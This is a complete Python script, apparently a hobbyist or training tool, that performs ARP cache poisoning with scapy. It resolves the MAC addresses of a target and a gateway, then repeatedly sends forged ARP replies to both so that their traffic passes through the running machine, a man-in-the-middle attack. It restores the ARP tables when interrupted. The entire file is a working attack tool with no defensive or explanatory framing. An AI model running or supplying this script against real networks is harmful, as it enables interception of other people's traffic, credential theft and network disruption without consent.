#!/usr/bin/env python

from scapy.all import *
import time
from optparse import OptionParser
import sys
from datetime import datetime
from pyfiglet import Figlet
from termcolor import cprint



def get_mac(ip):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_req
    arp_answered = srp(arp_broadcast, timeout=1, verbose=False)[0]
    return arp_answered[0][1].hwsrc


def poison(target_ip, target_mac, spoof_ip):
    #target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)


def get_arguments():
    command_parser = OptionParser()
    command_parser.add_option("-t", "--target", dest="target_ip", help="Target Device IP address.")
    command_parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP address.")
    options = command_parser.parse_args()[0]
    if not options.target_ip:
        command_parser.error("[-] Please specify a target IP address, use --help for more info...")
    elif not options.gateway_ip:
        command_parser.error("[-] Please specify a router IP address, use --help for more info...")
    return options


def print_banner(text):
    print("-" * 65)
    cprint(Figlet().renderText(text), 'red', attrs=['bold'])
    print("-" * 65)


print_banner("arp :: Poisoner")

options = get_arguments()
t1 = datetime.now()

target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    sent_packets = 0
    target_mac = get_mac(target_ip)
    time.sleep(2)
    gateway_mac = get_mac(gateway_ip)
    while True:
        poison(target_ip, target_mac, gateway_ip)
        poison(gateway_ip, gateway_mac, target_ip)
        sent_packets = sent_packets + 2
        print("\r[+] Packets sent : {}".format(str(sent_packets))),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[!] User interrupted... Halting the poisoner...")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] ARP Tables restored...")

t2 = datetime.now()
print("Poisoning done for: {} seconds".format(str(t2 - t1)))
